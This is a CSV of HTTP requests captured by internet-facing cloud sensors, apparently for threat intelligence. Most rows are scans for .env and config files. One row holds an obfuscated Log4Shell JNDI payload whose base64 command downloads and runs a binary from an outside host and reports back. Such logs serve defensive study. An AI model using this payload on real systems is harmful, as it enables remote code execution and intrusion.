args,full_path,created,json,cookies,url,headers,method,remote_addr,files,form,id,provider,ip,requesting_ip,gn_classification
{},/.env?,2023-04-13 20:02:21.922912+00:00,{},{},http://44.203.150.1/.env,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'X-Forwarded-For': '135.125.217.54', 'Host': '44.203.150.1', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '135.125.217.54'}",GET,,{},{},1d453669-276f-4803-a90f-6e2cb0b756d4,AWS,,135.125.217.54,unknown
{},/?,2023-04-19 09:35:24.676891+00:00,{},{},http://20.169.236.160/,"{'Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', 'X-Forwarded-For': '193.32.162.159', 'Host': '20.169.236.160', 'Accept-Encoding': 'gzip, deflate,gzip, deflate', 'Accept-Language': 'en US,en;q=0.9,sv;q=0.8', 'X-Real-Ip': '193.32.162.159', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}",GET,,{},{},df81219a-04e1-4a2e-b9fa-661389eb2001,Azure,,193.32.162.159,unknown
{},/.env?,2023-04-15 14:19:01.113101+00:00,{},{},http://3.86.163.161/.env,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'X-Forwarded-For': '20.55.58.5', 'Host': '3.86.163.161', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '20.55.58.5'}",GET,,{},{},8e1d5af6-fb8c-4775-913e-92e4a037d832,AWS,,20.55.58.5,unknown
{},/.env?,2023-04-13 00:53:55.657972+00:00,{},{},http://20.169.235.68/.env,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'X-Forwarded-For': '54.37.79.75', 'Host': '20.169.235.68', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '54.37.79.75'}",GET,,{},{},60d8ec82-0ff1-4547-9308-af5986392e57,Azure,,54.37.79.75,unknown
{},/?,2023-04-20 03:49:33.913831+00:00,{},{},http://20.169.235.110/,"{'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'X-Forwarded-For': '94.236.193.137', 'Host': '20.169.235.110:80', 'Content-Length': '0', 'X-Real-Ip': '94.236.193.137'}",GET,,{},{},f9377311-be5a-49cf-92f5-3fd5615e5a8d,Azure,20.169.235.110,94.236.193.137,malicious
{},/?,2023-04-07 21:03:21.763032+00:00,{},{},http://20.121.184.210/,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 zgrab/0.x', 'X-Forwarded-For': '172.104.210.105', 'Host': '20.121.184.210', 'Accept-Encoding': 'gzip', 'X-Real-Ip': '172.104.210.105'}",GET,,{},{},5e7002a6-8d7a-48b7-9de9-383dea1464de,Azure,,172.104.210.105,malicious
{},/?,2023-04-11 01:23:09.334600+00:00,{},{},http://20.169.235.68/,"{'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', 'X-Forwarded-For': '82.64.2.200', 'Host': '20.169.235.68:80', 'Content-Length': '0', 'X-Real-Ip': '82.64.2.200'}",GET,,{},{},259c7dac-43a3-4959-a90e-20bfb819b66d,Azure,20.169.235.68,82.64.2.200,malicious
{},/upl.php?,2023-04-18 16:12:18.537493+00:00,{},{},http://20.169.235.68/upl.php,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0', 'X-Forwarded-For': '142.93.153.109', 'Host': '20.169.235.68', 'Accept-Encoding': 'gzip', 'X-Real-Ip': '142.93.153.109'}",GET,,{},{},b43b2adc-d579-4cb2-8aa1-11d0ff62cb8c,Azure,,142.93.153.109,unknown
{},/?,2023-04-08 23:06:02.800998+00:00,{},{},http://20.169.235.68/,"{'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', 'X-Forwarded-For': '91.205.50.53', 'Host': '20.169.235.68:80', 'Content-Length': '0', 'X-Real-Ip': '91.205.50.53'}",GET,,{},{},fe61a4a7-4488-4ded-8b33-37794ba5d4a7,Azure,20.169.235.68,91.205.50.53,malicious
{},/aab8?,2023-04-21 09:32:41.075203+00:00,{},{},http://20.121.184.210/aab8,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 zgrab/0.x', 'X-Forwarded-For': '165.22.60.26', 'Host': '20.121.184.210', 'Accept-Encoding': 'gzip', 'X-Real-Ip': '165.22.60.26'}",GET,,{},{},8deaca55-2ac8-4be4-9b0d-5978d846bdf3,Azure,,165.22.60.26,malicious
{},/.env?,2023-04-12 09:09:07.296053+00:00,{},{},http://3.86.34.213/.env,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'X-Forwarded-For': '135.125.244.48', 'Host': '3.86.34.213', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '135.125.244.48'}",GET,,{},{},7f5baba8-dfac-4634-8f38-c7a9414beda9,AWS,,135.125.244.48,unknown
{},/favicon.ico?,2023-04-14 11:02:14.538817+00:00,{},{},http://54.166.141.59/favicon.ico,"{'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'X-Forwarded-For': '167.94.138.52', 'Host': '54.166.141.59', 'Accept-Encoding': 'gzip', 'X-Real-Ip': '167.94.138.52'}",GET,,{},{},a1938cd7-65fe-4d49-9fae-8e82e7fe503e,AWS,,167.94.138.52,benign
{},/?,2023-04-19 06:51:34.925290+00:00,{},{},http://20.169.235.110/,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'X-Forwarded-For': '165.232.166.224', 'Host': '20.169.235.110', 'Accept-Encoding': 'gzip', 'X-Real-Ip': '165.232.166.224'}",GET,,{},{},b64fd60a-ee58-4c4b-96fc-86bf7f050112,Azure,,165.232.166.224,unknown
{},/main.zip?,2023-04-17 17:53:18.348204+00:00,{},{},http://20.169.237.11/main.zip,"{'Accept': 'text/plain,*/*; charset=utf-8', 'Upgrade-Insecure-Requests': '1', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'X-Forwarded-For': '202.149.70.60', 'Host': '20.169.237.11', 'Accept-Encoding': 'text/plain,*/*; charset=utf-8', 'X-Real-Ip': '202.149.70.60'}",HEAD,,{},{},19ce41f9-15cf-4ff5-b3f1-492a853bedf4,Azure,,202.149.70.60,unknown
{},/?,2023-04-08 15:28:35.493133+00:00,{},"{""t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}')"": ''}",http://20.169.235.248/,"{'Cookie': ""t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}')"", 'Accept': 'application/json, text/plain, */*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': ""t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}')"", 'Referer': ""t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}')"", 'Host': '20.169.235.248', 'Originating-Ip': ""t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}')"", 'X-Client-Ip': ""t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}')"", 'Authentication': ""t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}')"", 'X-Forwarded-For': ""t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}'), 95.214.55.244"", 'X-Api-Version': ""t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}')"", 'X-Real-Ip': '95.214.55.244', 'Bearer': ""t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}')""}",GET,,{},{},efbf2eb2-5d0b-4111-8309-fde338f6718d,Azure,,"t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//129.151.84.124:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY3VybCAtTyBodHRwOi8vMTM0LjY1LjYyLjY0Ly5jb25maWcvemxpYjQ1IDsgY2htb2QgK3ggemxpYjQ1IDsgY2htb2QgNzc3IHpsaWI0NSA7IC4vemxpYjQ1IDIgOyBzdWRvIC4vemxpYjQ1IDIgOyBybSAtcmYgemxpYjQ1OyBjdXJsIGh0dHA6Ly8xMjkuMTUxLjY0LjU1L2FyY2gvJCh1bmFtZSAtbSkvdXNlci8kKHdob2FtaSk7IHN1ZG8gY3VybCBodHRwOi8vMTI5LjE1MS42NC41NS9hcmNoLyQodW5hbWUgLW0pL3VzZXIvJCh3aG9hbWkp}'), 95.214.55.244",unknown
{},/?,2023-04-10 04:58:35.199976+00:00,{},{},http://20.169.236.160/,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0', 'X-Forwarded-For': '38.110.46.2', 'Host': '20.169.236.160', 'Accept-Encoding': 'gzip', 'X-Real-Ip': '38.110.46.2'}",GET,,{},{},421ac600-c068-4b1c-8534-0b4732feba06,Azure,,38.110.46.2,benign
{},/.env?,2023-04-11 02:44:30.794350+00:00,{},{},http://20.121.184.210/.env,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'X-Forwarded-For': '51.79.29.48', 'Host': '20.121.184.210', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '51.79.29.48'}",GET,,{},{},4182a952-83c9-4928-aa83-2f6866b0c8f8,Azure,,51.79.29.48,unknown
{},/public?,2023-04-20 06:09:29.367142+00:00,{},{},http://20.121.184.210/public,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'X-Forwarded-For': '64.85.173.196', 'Host': '20.121.184.210', 'Accept-Encoding': 'gzip, deflate', 'Content-Length': '20', 'X-Real-Ip': '64.85.173.196', 'Content-Type': 'application/x-www-form-urlencoded'}",POST,,{},{'0x[]': 'androxgh0st'},b0bbce8b-7790-4217-aac5-635bb467f781,Azure,,64.85.173.196,malicious
{},/.env?,2023-04-19 10:45:25.141242+00:00,{},{},http://35.202.218.25/.env,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'X-Forwarded-For': '54.37.79.75', 'Host': '35.202.218.25', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '54.37.79.75'}",GET,,{},{},ae8be604-3127-4852-a65f-60990365674b,GCP,,54.37.79.75,unknown
{},/.env?,2023-04-11 12:56:38.375281+00:00,{},{},http://3.86.163.161/.env,"{'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Go-http-client/1.1', 'X-Forwarded-For': '178.62.73.12', 'Host': '3.86.163.161', 'Accept-Encoding': 'gzip', 'X-Real-Ip': '178.62.73.12'}",GET,,{},{},82c35357-acae-4d3e-8a57-d4034a5bca27,AWS,,178.62.73.12,malicious
{},/?,2023-04-10 21:57:02.185588+00:00,{},{},http://34.123.7.62/,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'X-Forwarded-For': '178.128.213.39', 'Host': '34.123.7.62', 'Accept-Encoding': 'gzip', 'X-Real-Ip': '178.128.213.39'}",GET,,{},{},4edf6f31-7335-42f8-8f00-501694721942,GCP,,178.128.213.39,unknown
{},/.env?,2023-04-14 21:32:09.193104+00:00,{},{},http://34.123.7.62/.env,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'X-Forwarded-For': '95.214.235.216', 'Host': '34.123.7.62', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '95.214.235.216'}",GET,,{},{},0b61db22-19d2-4495-b3ca-eb7d2babb471,GCP,,95.214.235.216,unknown
{},/.env?,2023-04-10 10:39:35.564244+00:00,{},{},http://44.202.14.136/.env,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', 'X-Forwarded-For': '40.76.226.243', 'Host': '44.202.14.136', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '40.76.226.243'}",GET,,{},{},3a13ca72-1e5b-4608-b51d-26dbaecb8e12,AWS,,40.76.226.243,malicious
{},/?,2023-04-15 11:05:21.723089+00:00,{},{},http://34.68.197.145/,"{'Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', 'X-Forwarded-For': '193.32.162.159', 'Host': '34.68.197.145', 'Accept-Encoding': 'gzip, deflate,gzip, deflate', 'Accept-Language': 'en US,en;q=0.9,sv;q=0.8', 'X-Real-Ip': '193.32.162.159', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}",GET,,{},{},e689124b-9c65-4f9a-a9df-d0966535154c,GCP,,193.32.162.159,unknown
{},/?,2023-04-20 22:25:04.232098+00:00,{},{},http://52.91.162.211/,"{'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com', 'X-Forwarded-For': '162.216.150.110', 'Host': '52.91.162.211:80', 'X-Real-Ip': '162.216.150.110'}",GET,,{},{},252c4ddf-c6fe-4571-a180-0fecbbd9dce9,AWS,52.91.162.211,162.216.150.110,benign
{},/?,2023-04-09 21:35:35.736877+00:00,{},{},http://20.121.184.210/,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0', 'X-Forwarded-For': '171.67.71.144', 'Host': '20.121.184.210', 'Accept-Encoding': 'gzip', 'X-Real-Ip': '171.67.71.144'}",GET,,{},{},b924034b-b672-434a-87e0-c74a089dabba,Azure,,171.67.71.144,benign
{},/config.json?,2023-04-11 14:39:54.022125+00:00,{},{},http://34.132.165.207/config.json,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'python-requests/2.28.1', 'X-Forwarded-For': '185.225.74.198', 'Host': '34.132.165.207', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '185.225.74.198'}",GET,,{},{},a4bc50ba-a7ba-4b75-aac4-a336016da6e8,GCP,,185.225.74.198,unknown
{},/?,2023-04-15 08:47:40.351388+00:00,{},{},http://20.169.235.233/,"{'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', 'X-Forwarded-For': '59.95.83.152', 'Host': '20.169.235.233:80', 'Content-Length': '0', 'X-Real-Ip': '59.95.83.152'}",GET,,{},{},51fad937-302d-4f40-b04b-deb4d3f3c092,Azure,20.169.235.233,59.95.83.152,unknown
{},/favicon.ico?,2023-04-13 08:57:29.256014+00:00,{},{},http://44.202.140.49/favicon.ico,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0', 'X-Forwarded-For': '51.159.164.227', 'Host': '44.202.140.49', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '51.159.164.227'}",GET,,{},{},4d353068-ea36-44f3-9144-d2af9b590239,AWS,,51.159.164.227,unknown
{},/?,2023-04-08 11:21:17.070442+00:00,{},{},http://54.166.141.59/,"{'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', 'X-Forwarded-For': '185.142.236.43', 'Host': '54.166.141.59', 'Accept-Encoding': 'identity', 'X-Real-Ip': '185.142.236.43'}",GET,,{},{},fa9bfc8a-fbff-41f1-a905-07d52f6b752c,AWS,,185.142.236.43,benign
{},/.env?,2023-04-15 20:26:01.386738+00:00,{},{},http://34.123.7.62/.env,"{'Accept': '*/*', 'X-Forwarded-Proto': 'http', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'X-Forwarded-For': '54.37.79.75', 'Host': '34.123.7.62', 'Accept-Encoding': 'gzip, deflate', 'X-Real-Ip': '54.37.79.75'}",GET,,{},{},b59540bf-6982-4ca5-9466-7a3528e30dfc,GCP,,54.37.79.75,unknown
